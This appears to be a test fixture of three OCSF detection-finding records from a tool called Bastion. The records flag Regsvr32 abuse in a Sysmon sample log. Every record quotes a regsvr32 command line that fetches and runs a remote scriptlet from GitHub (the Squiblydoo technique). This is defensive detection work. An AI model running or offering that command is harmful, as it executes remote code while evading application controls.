@@ -1,0 +1,347 @@
+[
+  {
+    "class_uid": 2004,
+    "class_name": "Detection Finding",
+    "category_uid": 2,
+    "category_name": "Findings",
+    "activity_id": 1,
+    "activity_name": "Create",
+    "type_uid": 200401,
+    "severity_id": 3,
+    "severity": "Medium",
+    "status_id": 1,
+    "status": "New",
+    "is_alert": true,
+    "finding_info": {
+      "uid": "5a9794e0d844720cfd0b088ba6824b4e",
+      "title": "Potential Regsvr32 Commandline Flag Anomaly",
+      "analytic": {
+        "uid": "b236190c-1c61-41e9-84b3-3fe03f6d76b0",
+        "name": "Potential Regsvr32 Commandline Flag Anomaly",
+        "type_id": 1,
+        "type": "Rule",
+        "version": "r2026-07-01"
+      },
+      "types": [
+        "Sigma rule match"
+      ],
+      "attacks": [
+        {
+          "technique": {
+            "uid": "T1218"
+          },
+          "sub_technique": {
+            "uid": "T1218.010",
+            "name": "Regsvr32"
+          },
+          "version": "20.1",
+          "tactic": {
+            "name": "stealth"
+          }
+        }
+      ]
+    },
+    "evidences": [
+      {
+        "data": {
+          "matched_fields": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
+          }
+        },
+        "actor": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "name": "svchost.exe",
+              "type_id": 1
+            },
+            "name": "svchost.exe",
+            "pid": 944,
+            "cmd_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
+            "uid": "{365abb72-b0ec-5cd9-0000-0010d9d20000}"
+          }
+        },
+        "process": {
+          "file": {
+            "path": "C:\\Windows\\System32\\regsvr32.exe",
+            "name": "regsvr32.exe",
+            "type_id": 1
+          },
+          "name": "regsvr32.exe",
+          "pid": 2476,
+          "cmd_line": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll",
+          "uid": "{365abb72-b167-5cd9-0000-001062160c00}",
+          "user": {
+            "name": "IEUser",
+            "domain": "IEWIN7"
+          },
+          "working_directory": "C:\\Windows\\system32\\",
+          "integrity": "Medium",
+          "parent_process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "name": "svchost.exe",
+              "type_id": 1
+            },
+            "name": "svchost.exe",
+            "pid": 944,
+            "cmd_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
+            "uid": "{365abb72-b0ec-5cd9-0000-0010d9d20000}"
+          }
+        }
+      }
+    ],
+    "metadata": {
+      "product": {
+        "name": "Bastion",
+        "vendor_name": "Bastion",
+        "version": "0.1.0"
+      },
+      "version": "1.9.0",
+      "profiles": [
+        "host"
+      ],
+      "log_source": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx"
+    },
+    "unmapped": {
+      "sigma_level": "medium",
+      "source_event_class_uid": 1007
+    },
+    "raw_data": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"></Provider>\n<EventID Qualifiers=\"\">1</EventID>\n<Version>5</Version>\n<Level>4</Level>\n<Task>1</Task>\n<Opcode>0</Opcode>\n<Keywords>0x8000000000000000</Keywords>\n<TimeCreated SystemTime=\"2019-05-13 18:03:19.681479+00:00\"></TimeCreated>\n<EventRecordID>17287</EventRecordID>\n<Correlation ActivityID=\"\" RelatedActivityID=\"\"></Correlation>\n<Execution ProcessID=\"276\" ThreadID=\"1000\"></Execution>\n<Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n<Computer>IEWIN7</Computer>\n<Security UserID=\"S-1-5-18\"></Security>\n</System>\n<EventData><Data Name=\"RuleName\"></Data>\n<Data Name=\"UtcTime\">2019-05-13 18:03:19.497</Data>\n<Data Name=\"ProcessGuid\">{365abb72-b167-5cd9-0000-001062160c00}</Data>\n<Data Name=\"ProcessId\">2476</Data>\n<Data Name=\"Image\">C:\\Windows\\System32\\regsvr32.exe</Data>\n<Data Name=\"FileVersion\">6.1.7600.16385 (win7_rtm.090713-1255)</Data>\n<Data Name=\"Description\">Microsoft(C) Register Server</Data>\n<Data Name=\"Product\">Microsoft&#174; Windows&#174; Operating System</Data>\n<Data Name=\"Company\">Microsoft Corporation</Data>\n<Data Name=\"CommandLine\">/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll</Data>\n<Data Name=\"CurrentDirectory\">C:\\Windows\\system32\\</Data>\n<Data Name=\"User\">IEWIN7\\IEUser</Data>\n<Data Name=\"LogonGuid\">{365abb72-b0ec-5cd9-0000-00201d340100}</Data>\n<Data Name=\"LogonId\">0x000000000001341d</Data>\n<Data Name=\"TerminalSessionId\">1</Data>\n<Data Name=\"IntegrityLevel\">Medium</Data>\n<Data Name=\"Hashes\">SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583</Data>\n<Data Name=\"ParentProcessGuid\">{365abb72-b0ec-5cd9-0000-0010d9d20000}</Data>\n<Data Name=\"ParentProcessId\">944</Data>\n<Data Name=\"ParentImage\">C:\\Windows\\System32\\svchost.exe</Data>\n<Data Name=\"ParentCommandLine\">C:\\Windows\\system32\\svchost.exe -k netsvcs</Data>\n</EventData>\n</Event>\n",
+    "time": 1557770599681,
+    "device": {
+      "type_id": 0,
+      "hostname": "IEWIN7"
+    }
+  },
+  {
+    "class_uid": 2004,
+    "class_name": "Detection Finding",
+    "category_uid": 2,
+    "category_name": "Findings",
+    "activity_id": 1,
+    "activity_name": "Create",
+    "type_uid": 200401,
+    "severity_id": 3,
+    "severity": "Medium",
+    "status_id": 1,
+    "status": "New",
+    "is_alert": true,
+    "finding_info": {
+      "uid": "ab49ba69d1ca5bf7770cb3494a2154f3",
+      "title": "Potentially Suspicious Regsvr32 HTTP/FTP Pattern",
+      "analytic": {
+        "uid": "867356ee-9352-41c9-a8f2-1be690d78216",
+        "name": "Potentially Suspicious Regsvr32 HTTP/FTP Pattern",
+        "type_id": 1,
+        "type": "Rule",
+        "version": "r2026-07-01"
+      },
+      "types": [
+        "Sigma rule match"
+      ],
+      "attacks": [
+        {
+          "technique": {
+            "uid": "T1218"
+          },
+          "sub_technique": {
+            "uid": "T1218.010",
+            "name": "Regsvr32"
+          },
+          "version": "20.1",
+          "tactic": {
+            "name": "stealth"
+          }
+        }
+      ]
+    },
+    "evidences": [
+      {
+        "data": {
+          "matched_fields": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
+          }
+        },
+        "actor": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "name": "svchost.exe",
+              "type_id": 1
+            },
+            "name": "svchost.exe",
+            "pid": 944,
+            "cmd_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
+            "uid": "{365abb72-b0ec-5cd9-0000-0010d9d20000}"
+          }
+        },
+        "process": {
+          "file": {
+            "path": "C:\\Windows\\System32\\regsvr32.exe",
+            "name": "regsvr32.exe",
+            "type_id": 1
+          },
+          "name": "regsvr32.exe",
+          "pid": 2476,
+          "cmd_line": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll",
+          "uid": "{365abb72-b167-5cd9-0000-001062160c00}",
+          "user": {
+            "name": "IEUser",
+            "domain": "IEWIN7"
+          },
+          "working_directory": "C:\\Windows\\system32\\",
+          "integrity": "Medium",
+          "parent_process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "name": "svchost.exe",
+              "type_id": 1
+            },
+            "name": "svchost.exe",
+            "pid": 944,
+            "cmd_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
+            "uid": "{365abb72-b0ec-5cd9-0000-0010d9d20000}"
+          }
+        }
+      }
+    ],
+    "metadata": {
+      "product": {
+        "name": "Bastion",
+        "vendor_name": "Bastion",
+        "version": "0.1.0"
+      },
+      "version": "1.9.0",
+      "profiles": [
+        "host"
+      ],
+      "log_source": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx"
+    },
+    "unmapped": {
+      "sigma_level": "medium",
+      "source_event_class_uid": 1007
+    },
+    "raw_data": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"></Provider>\n<EventID Qualifiers=\"\">1</EventID>\n<Version>5</Version>\n<Level>4</Level>\n<Task>1</Task>\n<Opcode>0</Opcode>\n<Keywords>0x8000000000000000</Keywords>\n<TimeCreated SystemTime=\"2019-05-13 18:03:19.681479+00:00\"></TimeCreated>\n<EventRecordID>17287</EventRecordID>\n<Correlation ActivityID=\"\" RelatedActivityID=\"\"></Correlation>\n<Execution ProcessID=\"276\" ThreadID=\"1000\"></Execution>\n<Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n<Computer>IEWIN7</Computer>\n<Security UserID=\"S-1-5-18\"></Security>\n</System>\n<EventData><Data Name=\"RuleName\"></Data>\n<Data Name=\"UtcTime\">2019-05-13 18:03:19.497</Data>\n<Data Name=\"ProcessGuid\">{365abb72-b167-5cd9-0000-001062160c00}</Data>\n<Data Name=\"ProcessId\">2476</Data>\n<Data Name=\"Image\">C:\\Windows\\System32\\regsvr32.exe</Data>\n<Data Name=\"FileVersion\">6.1.7600.16385 (win7_rtm.090713-1255)</Data>\n<Data Name=\"Description\">Microsoft(C) Register Server</Data>\n<Data Name=\"Product\">Microsoft&#174; Windows&#174; Operating System</Data>\n<Data Name=\"Company\">Microsoft Corporation</Data>\n<Data Name=\"CommandLine\">/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll</Data>\n<Data Name=\"CurrentDirectory\">C:\\Windows\\system32\\</Data>\n<Data Name=\"User\">IEWIN7\\IEUser</Data>\n<Data Name=\"LogonGuid\">{365abb72-b0ec-5cd9-0000-00201d340100}</Data>\n<Data Name=\"LogonId\">0x000000000001341d</Data>\n<Data Name=\"TerminalSessionId\">1</Data>\n<Data Name=\"IntegrityLevel\">Medium</Data>\n<Data Name=\"Hashes\">SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583</Data>\n<Data Name=\"ParentProcessGuid\">{365abb72-b0ec-5cd9-0000-0010d9d20000}</Data>\n<Data Name=\"ParentProcessId\">944</Data>\n<Data Name=\"ParentImage\">C:\\Windows\\System32\\svchost.exe</Data>\n<Data Name=\"ParentCommandLine\">C:\\Windows\\system32\\svchost.exe -k netsvcs</Data>\n</EventData>\n</Event>\n",
+    "time": 1557770599681,
+    "device": {
+      "type_id": 0,
+      "hostname": "IEWIN7"
+    }
+  },
+  {
+    "class_uid": 2004,
+    "class_name": "Detection Finding",
+    "category_uid": 2,
+    "category_name": "Findings",
+    "activity_id": 1,
+    "activity_name": "Create",
+    "type_uid": 200401,
+    "severity_id": 3,
+    "severity": "Medium",
+    "status_id": 1,
+    "status": "New",
+    "is_alert": true,
+    "finding_info": {
+      "uid": "274f379e24580903fab494d682479dd9",
+      "title": "Network Connection Initiated By Regsvr32.EXE",
+      "analytic": {
+        "uid": "c7e91a02-d771-4a6d-a700-42587e0b1095",
+        "name": "Network Connection Initiated By Regsvr32.EXE",
+        "type_id": 1,
+        "type": "Rule",
+        "version": "r2026-07-01"
+      },
+      "types": [
+        "Sigma rule match"
+      ],
+      "attacks": [
+        {
+          "technique": {
+            "uid": "T1559"
+          },
+          "sub_technique": {
+            "uid": "T1559.001",
+            "name": "Component Object Model"
+          },
+          "version": "20.1",
+          "tactic": {
+            "name": "execution"
+          }
+        },
+        {
+          "technique": {
+            "uid": "T1218"
+          },
+          "sub_technique": {
+            "uid": "T1218.010",
+            "name": "Regsvr32"
+          },
+          "version": "20.1",
+          "tactic": {
+            "name": "stealth"
+          }
+        }
+      ]
+    },
+    "evidences": [
+      {
+        "data": {
+          "matched_fields": {
+            "Initiated": "True",
+            "Image": "C:\\Windows\\System32\\regsvr32.exe"
+          }
+        },
+        "actor": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\regsvr32.exe",
+              "name": "regsvr32.exe",
+              "type_id": 1
+            },
+            "name": "regsvr32.exe",
+            "pid": 2476,
+            "uid": "{365abb72-b167-5cd9-0000-001062160c00}",
+            "user": {
+              "name": "IEUser",
+              "domain": "IEWIN7"
+            }
+          }
+        },
+        "src_endpoint": {
+          "ip": "10.0.2.15",
+          "port": 49159,
+          "hostname": "IEWIN7"
+        },
+        "dst_endpoint": {
+          "ip": "151.101.128.133",
+          "port": 443
+        }
+      }
+    ],
+    "metadata": {
+      "product": {
+        "name": "Bastion",
+        "vendor_name": "Bastion",
+        "version": "0.1.0"
+      },
+      "version": "1.9.0",
+      "profiles": [
+        "host"
+      ],
+      "log_source": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx"
+    },
+    "unmapped": {
+      "sigma_level": "medium",
+      "source_event_class_uid": 4001
+    },
+    "raw_data": "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"></Provider>\n<EventID Qualifiers=\"\">3</EventID>\n<Version>5</Version>\n<Level>4</Level>\n<Task>3</Task>\n<Opcode>0</Opcode>\n<Keywords>0x8000000000000000</Keywords>\n<TimeCreated SystemTime=\"2019-05-13 18:03:21.212896+00:00\"></TimeCreated>\n<EventRecordID>17289</EventRecordID>\n<Correlation ActivityID=\"\" RelatedActivityID=\"\"></Correlation>\n<Execution ProcessID=\"276\" ThreadID=\"2056\"></Execution>\n<Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n<Computer>IEWIN7</Computer>\n<Security UserID=\"S-1-5-18\"></Security>\n</System>\n<EventData><Data Name=\"RuleName\"></Data>\n<Data Name=\"UtcTime\">2019-05-13 18:03:20.485</Data>\n<Data Name=\"ProcessGuid\">{365abb72-b167-5cd9-0000-001062160c00}</Data>\n<Data Name=\"ProcessId\">2476</Data>\n<Data Name=\"Image\">C:\\Windows\\System32\\regsvr32.exe</Data>\n<Data Name=\"User\">IEWIN7\\IEUser</Data>\n<Data Name=\"Protocol\">tcp</Data>\n<Data Name=\"Initiated\">True</Data>\n<Data Name=\"SourceIsIpv6\">False</Data>\n<Data Name=\"SourceIp\">10.0.2.15</Data>\n<Data Name=\"SourceHostname\">IEWIN7</Data>\n<Data Name=\"SourcePort\">49159</Data>\n<Data Name=\"SourcePortName\"></Data>\n<Data Name=\"DestinationIsIpv6\">False</Data>\n<Data Name=\"DestinationIp\">151.101.128.133</Data>\n<Data Name=\"DestinationHostname\"></Data>\n<Data Name=\"DestinationPort\">443</Data>\n<Data Name=\"DestinationPortName\">https</Data>\n</EventData>\n</Event>\n",
+    "time": 1557770601212,
+    "device": {
+      "type_id": 0,
+      "hostname": "IEWIN7"
+    }
+  }
+]
